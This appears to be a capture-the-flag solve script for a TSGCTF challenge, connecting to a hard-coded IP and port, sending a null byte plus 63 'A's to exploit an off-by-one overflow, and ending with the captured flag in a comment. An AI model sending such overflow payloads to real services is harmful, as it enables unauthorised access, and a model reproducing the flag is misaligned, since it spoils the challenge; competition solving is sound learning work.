from telnetlib import Telnet


def main():
    tn = Telnet('34.146.101.4', 30007)
    tn.read_until(b'>')

    payload = b'\0' + b'A' * 63 + b'\n'
    tn.write(payload)

    tn.interact()


if __name__ == '__main__':
    main()
    # TSGCTF{just_a_simple_off_by_one-chall_isnt_it}
